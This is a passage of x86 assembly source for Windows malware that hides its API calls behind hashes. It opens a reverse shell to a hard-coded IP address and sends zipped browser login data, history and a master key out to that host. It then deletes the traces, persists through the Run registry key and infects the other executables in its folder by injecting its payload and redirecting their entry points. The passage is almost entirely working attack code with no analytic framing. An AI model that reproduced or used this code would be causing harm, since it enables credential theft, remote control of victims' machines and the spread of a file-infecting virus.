	Push 0BB5F9EADH         ; hash("kernel32.dll!ReadFile")
	Call hash_api

	; Close file
close_zip:
	Push Esi
	Push 528796C6H          ; hash("kernel32.dll!CloseHandle")
	Call hash_api

	Xchg Edi, Esi			; esi = zip file buffer

reverse_shell:
	; Load ws2_32.dll library
	Mov Ax, 3233H
	Push Eax
	Push 5F327377H
	Push Esp
	Push 0726774CH 					; hash('kernel32.dll', 'LoadLibraryA')
	Call hash_api

	; System call: WSAStartup
	Xor Ecx, Ecx
	Mov Cx, 190H
	Sub Esp, Ecx					; Creating space for WSAData
	Push Esp					; lpWSAData
	Push Ecx
	Push 6B8029H					; hash('ws2_32.dll', 'WSAStartup')
	Call hash_api

	; System call: WSASocketA
	Push Eax					; dwFlags = NULL
	Push Eax					; g = NULL
	Push Eax					; lpProtocolInfo = NULL
	Push Eax					; protocol = NULL
	Inc Eax
	Push Eax					; type = 1 (SOCKSTREAM)
	Inc Eax
	Push Eax					; af = 2 (AFINET)
	Push 0E0DF0FEAH					; hash('ws2_32.dll', 'WSASocketA')
	Call hash_api
	Xchg Eax, Edi					; WSASocketA() Handler

	; Sytem call: connect
	; connect(SOCKET s, const addr *name, int namelen)
	; listen on port 4444 (0x5C11), IPv4 set to AF_INET (0x0002) => 5C110002
	; listen on all interfaces
	Push 0A964A8C0H 					; 192.168.100.169
	Mov Eax, 5C110102H
	Dec Ah						; 5C110102 => 5C110002 (Remove 01)
	Push Eax					; namelen 
	Push Esp					; *name: 5C110002
	Push Edi					; Arg 1(s): WSASocketA() Handler
	Push 6174A599H					; hash("ws2_32.dll", "connect")
	Call hash_api

	; CreateProcessA
	Push 61646D63H
	Sub DWord Ptr [Esp + 3H], 61H
	Mov Edx, Esp					; edx = pointer to "cmd"

	; STARTUPINFO struct
	Push Edi					; SetStdInput to WSASocketA() handler
	Push Edi					; SetStdOutput to WSASocketA() handler
	Push Edi					; SetStdError to WSASocketA() handler
	Push 12H					; 18
	Pop Ecx

zero_mem_struct:
	Push Eax					; NULL
	Loop zero_mem_struct				; Push 0x00000000 18 times
	Mov Word Ptr [Esp + 3CH], 101H			; dwFlag (60 bytes from the top of the stack)
	Mov Byte Ptr [Esp + 10H], 44H
	Lea Edi, [Esp + 10H]

	; Calling CreateProcessA
	Push Esp					; Pointer to PROCESS_INFORMATION structure
	Push Edi					; Pointer to STARUPINFOA structure
	Push Eax
	Push Eax
	Push Eax
	Inc Eax
	Push Eax					; bInheritAttributes = True
	Dec Eax
	Push Eax					; lpThreadAttributes = False
	Push Eax					; lpProcessAttributes
	Push Edx					; Pointer to cmdline
	Push Eax					; lpApplicationName
	Push 863FCC79H					; hash("kernel32.dll", "CreateProcessA")
	Call hash_api					; CreateProcessA

	; Calling WaitForSingleObject
	Xor Edx, Edx
	Mov Eax, Esp					; eax = pointer to PROCESS_INFORMATION structure
	Push Edx					; dwMiliseconds = 0
	Push DWord Ptr [Eax]
	Push 601D8708H					; hash("kernel32.dll", "WaitForSingleObject")
	Call hash_api

	; Reinitialize Winsock with WSAStartup
	Xor Ecx, Ecx
	Mov Cx, 190H                    ; wVersionRequested (use 0x202 for better compatibility if possible)
	Sub Esp, Ecx                    ; Space for WSAData
	Push Esp                        ; lpWSAData
	Push Ecx
	Push 6B8029H                    ; hash('ws2_32.dll', 'WSAStartup')
	Call hash_api

	; Create new socket for port 6000
	Push Eax                        ; dwFlags = NULL
	Push Eax                        ; g = NULL
	Push Eax                        ; lpProtocolInfo = NULL
	Push Eax                        ; protocol = NULL
	Inc Eax
	Push Eax                        ; type = 1 (SOCK_STREAM)
	Inc Eax
	Push Eax                        ; af = 2 (AF_INET)
	Push 0E0DF0FEAH                 ; hash('ws2_32.dll', 'WSASocketA')
	Call hash_api
	Mov Edi, Eax                    ; New socket handle

	; Connect to port 6000 on 192.168.100.169
	Push 0A964A8C0H 					; 192.168.100.169
	Mov Eax, 70170002H              ; sockaddr_in: port 6000 (0x1770), AF_INET (0x0002)
	Push Eax                        ; namelen = sizeof(sockaddr_in) (assume 16, adjust if needed)
	Push Esp                        ; *name
	Push Edi                        ; Socket handle
	Push 6174A599H                  ; hash("ws2_32.dll", "connect")
	Call hash_api

	Lea Eax, [Ebp - 0C0H]           ; Eax points to the file size (DWORD)
	Push 0                          ; flags = 0
	Push 4                          ; len = 4 (bytes)
	Push Eax                        ; buf = pointer to file size
	Push Edi                        ; s = socket handle
	Push 5F38EBC2H                  ; hash("ws2_32.dll!send")
	Call hash_api
	Cmp Eax, 4                      ; Check if 4 bytes were sent
	Jne SetRegistryKey

	; Send the zip buffer
	Push 0                          ; flags = 0
	Push [Ebp - 0C0H]               ; len = zip file size
	Push Esi                        ; buf = zip file buffer
	Push Edi                        ; s = socket handle
	Push 5F38EBC2H				; hash("ws2_32.dll!send")
	Call hash_api
	Cmp Eax, 0FFFFFFFFH             ; Check for SOCKET_ERROR
	Je SetRegistryKey

	Push Edi
	Push 0AA62FCA3H          ; hash("kernel32.dll!GlobalFree")
	Call hash_api

	Xor Eax, Eax
	Push Eax						; push 0 to separate the parameters from the rest of da stack

	; Remove all relevant files
	Mov Eax, [Ebp - 0E0H]				; tmpLoginData
	Push Eax							; lpFileName
	Push 13DD2ED7H						; hash("kernel32.dll!DeleteFileA")
	Call hash_api

	Mov Eax, [Ebp - 0DCH]				; tmpWebData
	Push Eax							; lpFileName
	Push 13DD2ED7H						; hash("kernel32.dll!DeleteFileA")
	Call hash_api

	Mov Eax, [Ebp - 0D8H]				; tmpHistory
	Push Eax							; lpFileName
	Push 13DD2ED7H						; hash("kernel32.dll!DeleteFileA")
	Call hash_api

	Mov Eax, [Ebp - 0F4H]				; output masterkey
	Push Eax							; lpFileName
	Push 13DD2ED7H						; hash("kernel32.dll!DeleteFileA")
	Call hash_api

	Mov Eax, [Ebp - 0CCH]				; output zip file
	Push Eax							; lpFileName
	Push 13DD2ED7H						; hash("kernel32.dll!DeleteFileA")
	Call hash_api

	; Unlink ws2_32.dll
	Stc							; Set the flag to unlink the dll
	Push 9211A042H				; Hash ws2_32.dll
	Call hash_api

	; Unlink crypt32.dll
	Stc
	Push 3A6F2D31H				; Hash crypt32.dll
	Call hash_api

SetRegistryKey:
	; Load Advapi32.dll
	Xor Edx, Edx
	Push Edx
	Push 32336970H
	Push 61766441H
	Push Esp
	Push 0726774CH 					; hash("kernel32.dll", "LoadLibraryA")
	Call hash_api

	Mov Edx, [Ebp - 0C8H]			; edx = Pointer to "Software\Microsoft\Windows\CurrentVersion\Run"
	Xor Ecx, Ecx

	; Set hKey with RegOpenKeyExA
	Lea Eax, [Ebp - 10H]
	Push Eax					; phkResult
	Push 2H						; samDesired = KEY_SET_VALUE
	Push Ecx					; ulOptions = NULL
	Push Edx					; lpSubkey
	Mov Ch, 80H
	Shl Ecx, 16
	Mov Cl, 1H					; ecx = 0x80000001
	Push Ecx					; hKey = HKEY_CURRENT_USER
	Push 3E9E3F88H					; hash ("Advapi32.dll", 'RegOpenKeyExA')
	Call hash_api
	Mov Edi, [Ebp - 10H]

	; Retrieve the path of the current process
	Xor Ecx, Ecx
	Push Ecx
	Mov Cx, 104H
	Push Ecx					; nSize = 260 bytes
	Lea Esi, [Ebp - 200H]
	Push Esi					; lpFileName
	Push Eax					; hModule = NULL
	Push 0FE61445DH
	Call hash_api					; Call GetModuleFileNameA

	Push Esi					; Pointer to buffer that stores exe path
	Push 0CC8E00F4H
	Call hash_api					; Call lstrlenA

	Xor Ecx, Ecx
	Push Ecx					; NULL
	Push 74696873H					; "shit"
	Mov Edx, Esp					; ebx = Pointer to "shit" string

	; RegSetValueExA
	Push Eax					; cbData
	Lea Eax, [Ebp - 200H]				; Pointer to buffer that stores exe path
	Push Eax
	Inc Ecx
	Push Ecx					; dwType = REG_SZ
	Dec Ecx
	Push Ecx					; Reserved
	Push Edx					; lpValueName
	Push Edi					; hKey
	Push 0B97A6615H
	Call hash_api					; Call RegSetValueExA

	Push Edi
	Push 81C2AC44H
	Call hash_api					; Call RegCloseKey

	; Unlink advapi32.dll
	Stc							; Set flag for unlinking dll
	Push 0E290FD31H
	Call hash_api

	Lea Edi, [Ebp - 150H]

; Copy the path from [ebp - 200H] to [ebp - 150H]
copy_loop:
	Lodsb
	Stosb
	Test Al, Al
	Jnz copy_loop

	Call find_last_backslash			; Remove the last backslash to get the directory from the path
	Lea Ebx, [Ebp - 200H]
	Push Ebx					; lpString2
	Lea Edx, [Ebp - 300H]
	Push Edx					; lpString1
	Push 0E28D73B4H					; hash ("kernel32.dll", "lstrcpyA")
	Call hash_api

	; Find all exe files in the directory
	Lea Ebx, [Ebp - 300H]
	Push Ebx
	Push 0CC8E00F4H					; hash ("kernel32.dll", "lstrlenA")
	Call hash_api

	Add Ebx, Eax
	Mov DWord Ptr [Ebx], 78652E2AH			; "*.ex"
	Mov Word Ptr [Ebx + 4H], 065H			; "e"

	Lea Eax, [Ebp - 400H]
	Push Eax
	Lea Eax, [Ebp - 300H]
	Push Eax					; "Path\To\CurrentDirectory\*.exe"
	Push 95DA3590H					; hash("kernel32.dll", "FindFirstFileA")
	Call hash_api
	Mov [Ebp - 48H], Eax				; Save FindFirstFileA handle for later use

process_files_loop:
	; Cut the name of the exe file returned from FindFirstFileA
	; And append it to the current directory using lstrcatA => path to the exe file
	Lea Eax, [Ebp - 400H + 2CH]			; cFileName
	Push Eax					; [in] lpString2 : Name of the exe file
	Lea Eax, [Ebp - 200H]
	Push Eax					; [in, out] lpString1 : This will hold the address of the file for injection
	Push 0C48D7274H					; hash ("kernel32.dll", "lstrcatA")
	Call hash_api

	; Compare the constructed path with the current process path
	Lea Eax, [Ebp - 200H]				; Path to the target exe
	Push Eax
	Lea Eax, [Ebp - 150H]				; Path of the running process
	Push Eax
	Push 0DC8D7174H					; hash("kernel32.dll", "lstrcmpA")
	Call hash_api

	; If identical, skip to next file
	Test Eax, Eax
	Je infect_next_file

	; If not identical, proceed with injecting
	Jmp InjectingFile

infect_next_file:
	; Move on to the next exe file
	Call find_last_backslash			; Remove the last backslash to get the directory from the path
	Mov Edi, [Ebp - 48H]				; Load FindFirstFileA handle to edi
	Lea Eax, [Ebp - 400H]
	Push Eax					; LPWIN32_FIND_DATAA
	Push Edi					; FindFirstFileA handle
	Push 0F76C45E7H					; hash("kernel32.dll", "FindNextFileA")
	Call hash_api

	; Check if there are more files to process
	Test Eax, Eax
	Jne process_files_loop

	; No more file, jump to success
	Jmp exit_success

find_last_backslash:
	; Find the last backslash in the path and null-terminate the string
	Lea Ebx, [Ebp - 200H]
	Push Ebx					; Path to the current exe
	Push 0CC8E00F4H					; hash("kernel32.dll", "lstrlenA")
	Call hash_api					; Size of the path => eax
	Add Ebx, Eax               			; Point edx to the end of the string
	Dec Ebx

find_backslash_loop:
	Cmp Byte Ptr [Ebx], 5CH     			; 5C = "\"
	Je found_backslash				; If found then jump to next step
	Dec Ebx						; Else, keep decreasing until the "\" is found
	Jmp find_backslash_loop				; Loop

found_backslash:
	Mov Byte Ptr [Ebx + 1H], 0H 			; Null-terminate the string at the last backslash
	Ret

InjectingFile:
	Xor Ecx, Ecx
	Lea Eax, [Ebp - 200H]
	Push Ecx					; hTemplatefile (NULL)
	Push Ecx					; dwFlagsAndAttributes (NULL)
	Push 3H						; dwCreationDisposition (OPEN_EXISTING)
	Push Ecx					; lpSecurityAttributes (NULL)
	Push 1H						; dwShareMode (FILE_SHARE_READ)
	Mov Ch, 0C0H
	Shl Ecx, 16					; ecx = 0x0C0000000
	Push Ecx					; dwDesiredAccess (GENERIC_WRITE or GENERIC_READ)
	Push Eax					; lpFilePath
	Push 4FDAF6DAH					; hash("kernel32.dll", "CreateFileA")
	Call hash_api
	Cmp Eax, 0FFFFFFFFH				; Check if handle is valid

	Je infect_next_file					; If the handle is invalid => infect the next file
	Mov [Ebp - 4CH], Eax				; Store the file handle

	Xor Edx, Edx
	Push Edx					; NULL
	Push Edx					; 0
	Push Edx					; 0
	Push 4H						; PAGE_READWRITE
	Push Edx					; lpFileMappingAttributes = 0
	Push Eax					; fileHandle
	Push 23F9CD0AH					; hash("kernel32.dll", "CreateFileMappingA")
	Call hash_api

	; Check if mapping handle is valid
	Cmp Eax, Ecx
	Je exit
	Mov [Ebp - 50H], Eax				; Store mapping handle
	Mov Ecx, Eax

	; Get the address of the mapped file
	Xor Ebx, Ebx
	Push Ebx
	Push Ebx
	Push Ebx
	Push 2H						; dwDesiredAccess = FILE_MAP_WRITE
	Push Ecx
	Push 757AEF13H					; hash("kernel32.dll", "MapViewOfFile")
	Call hash_api

	; Check if mapping address is valid
	Cmp Eax, Ebx
	Je exit
	Mov Ebx, Eax					; Base address of the infected file
	Mov [Ebp - 58H], Eax				; Save the base address

	Mov Eax, [Eax + 34H]
	Test Eax, Eax					; Checking if the file has been infected or not
	Jnz infect_next_file				; If it's infected, move to next file

	Mov Edi, [Ebx + 3CH]
	Add Edi, Ebx					; PE signature

	Mov Eax, [Edi + 4H]		
	Cmp Ax, 14CH					; Check if the file is 32 bit executable or not
	Jne infect_next_file

	Mov Eax, [Edi + 3CH]
	Mov [Ebp - 64H], Eax				; FileAlignment

	Mov Eax, [Edi + 38H]
	Mov [Ebp - 68H], Eax				; SectionAlignment

	Mov Eax, [Edi + 28H]				; AddressOfEntryPoint
	Mov Edx, [Edi + 34H]				; ImageBase
	Add Eax, Edx					; Jump back entry point

	Mov [Ebx + 34H], Eax				; Tell the injected file where the jump back entry point is

	Mov Eax, [Edi + 50H]
	Mov [Ebx + 30H], Eax				; Save SizeOfImage for backup later
	Mov [Ebp - 60H], Eax				; SizeOfImage

	Mov Ax, [Edi + 6H]				; Number of section
	Mov Cl, 0F8H
	Movzx Ecx, Cl
	Add Edi, Ecx					; Skip through Optional Header
	Dec Ax
	Mov Dl, 40
	IMul Dl
	Movzx Eax, Ax
	Add Edi, Eax					; Move to the last section info in section table
	Push Edi					; Save the current position in the section table for later use

	; Calculate new virtual size of the last section
	; and distance to move to inject the payload
	Mov Eax, [Edi + 8H]				; Move to the last section virtual size
	Mov [Ebx + 2CH], Eax				; Save virtual size for backup later
	Mov Edx, [Edi + 14H]				; Move to last section raw address
	Add Edx, Eax
	Mov [Ebp - 70H], Edx				; Save the distance to move for the payload injection

	Mov Cx, PayloadSize
	Add Eax, Ecx
	Mov [Edi + 8H], Eax
	Push Eax					; Save new virtual size
	Mov Esi, [Ebp - 4CH]				; esi = fileHandle

	; Calculate new raw size of the last section
	Mov Eax, [Edi + 10H]				; Move to last section raw size
	Mov [Ebx + 38H], Eax				; Save RawSize for backup later
	Add Eax, Ecx
	Mov Ecx, [Ebp - 64H]				; FileAlignment
	Dec Ecx
	Add Eax, Ecx
	Not Ecx
	And Eax, Ecx
	Mov [Edi + 10H], Eax				; Update new raw size of the last section

	Mov Eax, [Edi + 24H]
	Mov [Ebx + 28H], Eax				; Save the current Characteristics for backup later
	Mov Bh, 60H
	Shl Ebx, 16
	Mov Bl, 20H
	Or Eax, Ebx					; IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE
	Mov [Edi + 24H], Eax				; Update last section characteristics

	; Calculate new AddressOfEntryPoint = VirtualAddress + VirtualSize - PayloadSize
	Mov Eax, [Edi + 0CH]				; VirtualAdress
	Pop Ecx						; VirtualSize
	Add Eax, Ecx
	Mov Cx, PayloadSize
	Sub Eax, Ecx

	Mov Edi, [Ebp - 58H]				; Base address
	Add Edi, [Edi + 3CH]				; Move back to PE signature
	Mov [Edi + 28H], Eax				; Update new AddressOfEntryPoint

	; Calculate new SizeOfImage and roundit up with section alignment
	Mov Eax, [Edi + 50H]				; eax = offset of SectionAlignment
	Dec Eax
	Add Ecx, Eax
	Not Eax
	And Ecx, Eax
	Mov Eax, [Ebp - 60H]				; eax = SizeOfImage
	Add Ecx, Eax
	Mov [Edi + 50H], Ecx				; Update new SizeOfImage

	; Turn off DLL can move flag
	Mov Eax, [Edi + 5EH]
	Xor Ecx, Ecx
	Mov Cl, 40H					; IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
	Not Ecx
	And Eax, Ecx					; Clear the flag
	Mov [Edi + 5EH], Eax
	Pop Edi						; Restore the current position in the section table

	; Injecting the payload
	Mov Edx, [Ebp - 70H]				; Load distance to move to edx
	Xor Ebx, Ebx
	Push Ebx					; FILE_BEGIN
	Push Ebx					; NULL
	Push Edx
	Push Esi					; FileHandle
	Push 0D812CDAAH					; hash("kernel32.dll", "SetFilePointer")
	Call hash_api

	Lea Eax, [Ebp - 6CH]
	Push Ebx					; lpOverlapped = NULL
	Push Eax					; lpNumberOfBytesWritten
	Xor Eax, Eax
	Mov Ax, PayloadSize
	Push Eax
	Mov Edx, [Ebp - 108H]				; Load payload base address to edx
	Lea Eax, [Edx]					; Point eax to the beginning of the payload
	Push Eax					; lpBuffer
	Push Esi					; FileHandle
	Push 5BAE572DH					; hash("kernel32.dll", "WriteFile")
	Call hash_api

	; Set end of file
	Mov Eax, [Edi + 10H]				; Move to the last section raw size
	Mov Edx, [Edi + 14H]				; Move to last section raw address
	Add Edx, Eax
	Push Ebx					; FILE_BEGIN
	Push Ebx					; NULL
	Push Edx
	Push Esi					; FileHandle
	Push 0D812CDAAH					; hash("kernel32.dll", "SetFilePointer")
	Call hash_api

	Push Esi					; FileHandle
	Push 0D7E3CBDBH					; hash("kernel32.dll", SetEndOfFile")
	Call hash_api					; Call SetEndOfFile
	Jmp infect_next_file

PayloadSize = $ -payload

End start
